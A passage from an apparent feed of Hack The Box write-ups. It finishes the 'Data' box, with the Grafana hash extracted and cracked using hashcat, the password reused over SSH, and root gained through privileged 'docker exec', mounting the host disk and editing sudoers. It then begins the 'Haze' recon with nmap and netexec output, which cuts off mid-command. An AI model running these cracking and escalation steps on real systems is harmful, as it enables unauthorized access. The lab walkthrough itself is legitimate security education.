format. I showed in detail how to make a hash for <code class="language-plaintext highlighter-rouge">hashcat</code> in <a href="/2025/05/03/htb-bigbang.html#crack-hash">BigBang</a> using <a href="https://github.com/iamaldi/grafana2hashcat">this repo</a>. I’ll get the username, password hash, and salt:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt; </span><span class="k">select</span> <span class="n">login</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">salt</span> <span class="k">from</span> <span class="k">user</span><span class="p">;</span> <span class="go">login|password|salt admin|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl </span></code></pre></div></div> <p>I’ll format that into the input format of <code class="language-plaintext highlighter-rouge">hash,salt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl </span></code></pre></div></div> <p>Now the script makes a hash:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run grafana2hashcat.py grafana.hash_salt <span class="go"> [+] Grafana2Hashcat [+] Reading Grafana hashes from: grafana.hash_salt [+] Done! Read 2 hashes in total. [+] Converting hashes... [+] Converting hashes complete. [*] Outfile was not declared, printing output to stdout instead. sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg= sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag= [+] Now, you can run Hashcat with the following command, for example: hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt </span></code></pre></div></div> <h4 id="crack-password">Crack Password</h4> <p><code class="language-plaintext highlighter-rouge">hashcat</code> detects the hash format and cracks the boris hash very quickly:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat grafana.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="go">hashcat (v6.2.6) starting in autodetect mode ...[snip]... Hash-mode was not specified with -m. Attempting to auto-detect hash mode. The following mode was auto-detected as the only one matching your input hash: 10900 | PBKDF2-HMAC-SHA256 | Generic KDF ...[snip]... sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1 ...[snip]... </span></code></pre></div></div> <p>admin doesn’t crack.</p> <h3 id="ssh">SSH</h3> <p>I can log into the website, but it’s worth checking if these creds work on the system. boris isn’t a user in the <code class="language-plaintext highlighter-rouge">passwd</code> file I read earlier, but that was in a container system and SSH seems to connect to the main host (based on TTL analysis).</p> <p>It’s worth checking, and they work:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ssh 10.129.234.47 <span class="nt">-u</span> boris <span class="nt">-p</span> beautiful1 <span class="netexec-protocol">SSH </span><span class="go"> 10.129.234.47 22 10.129.234.47 </span><span class="netexec-logmessage">[*]</span><span class="go"> SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7 </span><span class="netexec-protocol">SSH </span><span class="go"> 10.129.234.47 22 10.129.234.47 </span><span class="netexec-logsuccess">[+]</span><span class="go"> boris:beautiful1 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> Linux - Shell access! </span></code></pre></div></div> <p>I’ll connect to SSH as boris:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> beautiful1 ssh boris@10.129.234.47 <span class="go">Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64) ...[snip]... </span><span class="gp">boris@data:~$</span><span class="w"> </span></code></pre></div></div> <p><em>Disclaimer - I like to use <code class="language-plaintext highlighter-rouge">sshpass</code> to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.</em></p> <p>The OS matches what I predicted during initial enumeration.</p> <p>I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt <span class="go">87629c0b************************ </span></code></pre></div></div> <h2 id="shell-as-root">Shell as root</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="sudo">sudo</h4> <p>boris can run <code class="language-plaintext highlighter-rouge">docker exec</code> as root without a password using <code class="language-plaintext highlighter-rouge">sudo</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span> <span class="go">Matching Defaults entries for boris on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User boris may run the following commands on localhost: (root) NOPASSWD: /snap/bin/docker exec * </span></code></pre></div></div> <h4 id="running-containers">Running Containers</h4> <p>Typically I would like running containers with <code class="language-plaintext highlighter-rouge">docker ps</code>. Unfortunately, that requires access to the Docker socket, which means root (and the <code class="language-plaintext highlighter-rouge">sudo</code> configuration doesn’t allow this):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span>docker ps <span class="go">Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied </span><span class="gp">boris@data:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /var/run/docker.sock <span class="go">srw-rw---- 1 root root 0 Jun 16 01:16 /var/run/docker.sock </span></code></pre></div></div> <p>I can look at the running processes:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>docker <span class="go">root 1001 0.0 3.9 1496232 79728 ? Ssl 01:15 0:12 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json root 1246 0.2 2.1 1351056 44512 ? Ssl 01:16 1:31 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error root 1494 0.0 0.1 1226188 3224 ? Sl 01:16 0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000 root 1499 0.0 0.1 1153864 3288 ? Sl 01:16 0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000 root 1517 0.0 0.4 712608 8140 ? Sl 01:16 0:02 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock 472 1537 0.0 3.1 776296 63052 ? Ssl 01:16 0:31 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning boris 28600 0.0 0.0 14860 1008 pts/0 S+ 13:10 0:00 grep --color=auto docker </span></code></pre></div></div> <p>There’s an ID for a running container, e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81.</p> <h4 id="devices">Devices</h4> <p>I’ll take a look at the mounted hardware on the host system:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span>mount <span class="go">sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime) proc on /proc type proc (rw,nosuid,nodev,noexec,relatime) udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755) devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000) tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755) /dev/sda1 on / type ext4 (rw,relatime) securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime) tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev) tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k) tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755) cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime) cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd) pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime) cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices) cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio) cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer) cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset) cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb) cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma) cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event) cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct) cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids) cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio) cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory) systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=24,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13696) debugfs on /sys/kernel/debug type debugfs (rw,relatime) mqueue on /dev/mqueue type mqueue (rw,relatime) hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M) configfs on /sys/kernel/config type configfs (rw,relatime) fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime) /var/lib/snapd/snaps/amazon-ssm-agent_4046.snap on /snap/amazon-ssm-agent/4046 type squashfs (ro,nodev,relatime,x-gdu.hide) /var/lib/snapd/snaps/docker_1125.snap on /snap/docker/1125 type squashfs (ro,nodev,relatime,x-gdu.hide) /var/lib/snapd/snaps/snapd_14066.snap on /snap/snapd/14066 type squashfs (ro,nodev,relatime,x-gdu.hide) /var/lib/snapd/snaps/core18_2253.snap on /snap/core18/2253 type squashfs (ro,nodev,relatime,x-gdu.hide) binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime) lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other) tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755) nsfs on /run/snapd/ns/docker.mnt type nsfs (rw) tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=203116k,mode=700,uid=1001,gid=1001) </span></code></pre></div></div> <p>Most interesting to me is that <code class="language-plaintext highlighter-rouge">/dev/sda1</code> is mounted as <code class="language-plaintext highlighter-rouge">/</code>. I’ll need this shortly.</p> <h4 id="docker-exec">docker exec</h4> <p>The <code class="language-plaintext highlighter-rouge">docker exec</code> subcommand takes a container and a command, and has several options:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span>docker <span class="nb">exec</span> <span class="nt">-h</span> <span class="go">Flag shorthand -h has been deprecated, please use --help Usage: docker exec [OPTIONS] CONTAINER COMMAND [ARG...] Run a command in a running container Options: -d, --detach Detached mode: run command in the background --detach-keys string Override the key sequence for detaching a container -e, --env list Set environment variables --env-file list Read in a file of environment variables -i, --interactive Keep STDIN open even if not attached --privileged Give extended privileges to the command -t, --tty Allocate a pseudo-TTY -u, --user string Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;]) -w, --workdir string Working directory inside the container </span></code></pre></div></div> <p>I regularly run <code class="language-plaintext highlighter-rouge">docker exec -it &lt;container name&gt; bash</code> to get a shell in a running container on my system.</p> <h3 id="host-filesystem-access">Host Filesystem Access</h3> <p>The interesting option is <code class="language-plaintext highlighter-rouge">--privileged</code>. This will allow the resulting command to access raw hardware devices from within the container. I’ll use it and get a shell:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span><span class="nb">sudo </span>docker <span class="nb">exec</span> <span class="nt">-it</span> <span class="nt">--privileged</span> <span class="nt">--user</span> root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash <span class="gp">bash-5.1#</span><span class="w"> </span></code></pre></div></div> <p>I’ve also given <code class="language-plaintext highlighter-rouge">--user root</code> to be the root user inside the container.</p> <p>I’ll mount <code class="language-plaintext highlighter-rouge">/dev/sda1</code> onto a directory in the container. <code class="language-plaintext highlighter-rouge">/mnt</code> is there and empty, so I’ll use that:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.1# </span>mount /dev/sda1 /mnt/ <span class="gp">bash-5.1# </span><span class="nb">ls</span> /mnt/ <span class="go">bin home lib64 opt sbin tmp vmlinuz.old boot initrd.img lost+found proc snap usr dev initrd.img.old media root srv var etc lib mnt run sys vmlinuz </span></code></pre></div></div> <p>The host filesystem is now available inside the container! I can read the flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.1# </span><span class="nb">cat</span> /mnt/root/root.txt <span class="go">d5a19473************************ </span></code></pre></div></div> <h3 id="shell">Shell</h3> <p>There are a lot of ways to get a root shell with full access to the filesystem. I’ll open <code class="language-plaintext highlighter-rouge">/mnt/etc/sudoers</code> and add a line at the bottom:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.1# </span><span class="nb">tail</span> <span class="nt">-2</span> /mnt/etc/sudoers <span class="go">boris ALL = (root) NOPASSWD: /snap/bin/docker exec * boris ALL = (root) NOPASSWD: /bin/bash </span></code></pre></div></div> <p>Now back on the host system, boris can run <code class="language-plaintext highlighter-rouge">bash</code> as root:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span> <span class="go">Matching Defaults entries for boris on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User boris may run the following commands on localhost: (root) NOPASSWD: /snap/bin/docker exec * (root) NOPASSWD: /bin/bash </span></code></pre></div></div> <p>From there getting a shell is trivial:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">boris@data:~$</span><span class="w"> </span><span class="nb">sudo </span>bash <span class="gp">root@data:~#</span><span class="w"> </span><span class="nb">id</span> <span class="go">uid=0(root) gid=0(root) groups=0(root) </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-data"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="htb-data"/>
<category term="hackthebox"/>
<category term="ctf"/>
<category term="nmap"/>
<category term="vulnlabs"/>
<category term="grafana"/>
<category term="cve-2021-43798"/>
<category term="directory-traversal"/>
<category term="file-read"/>
<category term="htb-ambassador"/>
<category term="htb-bigbang"/>
<category term="grafana2hashcat"/>
<category term="docker"/>
<category term="docker-exec"/>
<category term="mount"/>
<category term="docker-privileged"/>
<summary type="html">
<![CDATA[ Data is a pretty straight forward easy box that starts with a Grafana instance. I’ll abuse an unauthenticated directory traversal / file read vulnerability to leak the SQLite file used by Grafana. I’ll crack a user hash and find it’s a shared password with an account on the system. For root, I’ll abuse a sudo rule that allows for running docker exec. Inside the container, I’ll mount the host file system and leverage that into a shell. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/data-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/data-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Haze</title>
<link href="https://0xdf.gitlab.io/2025/06/28/htb-haze.html" rel="alternate" type="text/html" title="HTB: Haze"/>
<published>2025-06-28T13:45:00+00:00</published>
<updated>2025-06-28T13:45:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/06/28/htb-haze</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/06/28/htb-haze.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/haze-cover.webp" /> <img loading="lazy" src="/img/haze-cover.png" alt="Haze" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Haze is built around an instance of Splunk Enterprise. I’ll start by exploiting a directory traversal / file read in Splunk that allows me to leak configuration files that container encrypted passwords. I’ll exfil the key and decrypt them, finding a password that’s reused by a user. That user has limited access, but I’m able to spray the password and find a second user with the same password. That user can abuse some Windows ACLs to get access to the gMSA password for a service account. I’ll use that account to get a Shadow Credential for the next user. From there I’ll access a Splunk backup archive, and find older passwords that work for the admin account on the Splunk website. I’ll upload a malicious Splunk application to get a shell as the next user. That shell has the SeImpersonatePrivilege, which I’ll abuse with GodPotato to get system access.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/654 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/haze" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Haze</a> <a href="https://hackthebox.com/machines/haze" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-haze.webp" /> <img src="/icons/box-haze.png" alt="Haze" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/haze" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1904956546708054435">29 Mar 2025</a></td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">28 Jun 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Windows <picture><source type="image/webp" srcset="/icons/Windows.webp" /><img src="/icons/Windows.png" alt="Windows" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td> </tr> <tr> <td>Rated Difficulty</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/haze-diff.webp" /><img src="/img/haze-diff.png" alt="Rated difficulty for Haze" style="display: unset;" /></picture></td> </tr> <tr> <td>Radar Graph</td> <td style="text-align: right"><picture><source type="image/webp" srcset="/img/haze-radar.webp" /><img src="/img/haze-radar.png" alt="Radar chart for Haze" style="display: unset;" /></picture></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">02:02:08</span><a href="https://app.hackthebox.com/users/647734" target="_blank" rel="noopener"><img alt="Mojo098" src="https://www.hackthebox.com/badge/image/647734" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> Mojo098</span></a><br /></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right"><span class="blood-time">02:47:01</span><a href="https://app.hackthebox.com/users/721418" target="_blank" rel="noopener"><img alt="zer0dave" src="https://www.hackthebox.com/badge/image/721418" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> zer0dave</span></a><br /></td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/962022" target="_blank" rel="noopener"><img alt="EmSec" src="https://www.hackthebox.com/badge/image/962022" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> EmSec</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="initial-scanning">Initial Scanning</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds 30 open TCP ports:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.10.11.61 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 16:44 UTC ...[snip]... Nmap scan report for 10.10.11.61 Host is up, received reset ttl 127 (0.092s latency). Scanned at 2025-06-23 16:44:52 UTC for 8s Not shown: 65505 closed tcp ports (reset) PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 8000/tcp open http-alt syn-ack ttl 127 8088/tcp open radan-http syn-ack ttl 127 8089/tcp open unknown syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49669/tcp open unknown syn-ack ttl 127 63514/tcp open unknown syn-ack ttl 127 63967/tcp open unknown syn-ack ttl 127 63968/tcp open unknown syn-ack ttl 127 63969/tcp open unknown syn-ack ttl 127 63978/tcp open unknown syn-ack ttl 127 63997/tcp open unknown syn-ack ttl 127 64006/tcp open unknown syn-ack ttl 127 64079/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 8.66 seconds Raw packets sent: 82609 (3.635MB) | Rcvd: 65536 (2.622MB) </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389 <span class="nt">-sCV</span> 10.10.11.61 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 16:45 UTC Nmap scan report for 10.10.11.61 Host is up (0.092s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-24 00:48:56Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.haze.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb | Not valid before: 2025-03-05T07:12:20 |_Not valid after: 2026-03-05T07:12:20 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=dc01.haze.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb | Not valid before: 2025-03-05T07:12:20 |_Not valid after: 2026-03-05T07:12:20 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.haze.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb | Not valid before: 2025-03-05T07:12:20 |_Not valid after: 2026-03-05T07:12:20 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.haze.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.haze.htb | Not valid before: 2025-03-05T07:12:20 |_Not valid after: 2026-03-05T07:12:20 |_ssl-date: TLS randomness does not represent time 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 8000/tcp open http Splunkd httpd |_http-server-header: Splunkd | http-title: Site doesn't have a title (text/html; charset=UTF-8). |_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F | http-robots.txt: 1 disallowed entry |_/ 8088/tcp open ssl/http Splunkd httpd |_http-server-header: Splunkd |_http-title: 404 Not Found | http-robots.txt: 1 disallowed entry |_/ | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2025-03-05T07:29:08 |_Not valid after: 2028-03-04T07:29:08 8089/tcp open ssl/http Splunkd httpd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2025-03-05T07:29:08 |_Not valid after: 2028-03-04T07:29:08 |_http-server-header: Splunkd | http-robots.txt: 1 disallowed entry |_/ |_http-title: splunkd 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-06-24T00:49:46 |_ start_date: N/A |_clock-skew: 8h02m56s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 66.95 seconds </span></code></pre></div></div> <p>The box shows many of the ports associated with a <a href="/cheatsheets/os#windows-domain-controller">Windows Domain Controller</a>. The domain is <code class="language-plaintext highlighter-rouge">haze.htb</code>, and the hostname is <code class="language-plaintext highlighter-rouge">dc01</code>.</p> <p>There’s also HTTP services reporting as Splunk on 8000, 8088, and 8089.</p> <p>I’ll generate a <code class="language-plaintext highlighter-rouge">hosts</code> entry using <code class="language-plaintext highlighter-rouge">netexec</code> and add it to my <code class="language-plaintext highlighter-rouge">hosts</code> file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.10.11.61 <span class="nt">--generate-hosts-file</span> hosts <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts <span class="go">10.10.11.61 DC01.haze.htb haze.htb DC01 </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>hosts /etc/hosts | sponge /etc/hosts </code></pre></div></div> <h3 id="smb---tcp-445">SMB - TCP 445</h3> <p>Guest or anonymous auth doesn’t work here:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.10.11.61 <span class="nt">-u</span> guest <span class="nt">-p</span> <span class="s1">''</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span class="netexec-logpurplefail">[-]</span><span class="go"> haze.htb\guest: STATUS_ACCOUNT_DISABLED </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.10.11.61 <span class="nt">-u</span> oxdf <span class="nt">-p</span> <span class="s1">''</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.61 445 DC01 </span><span 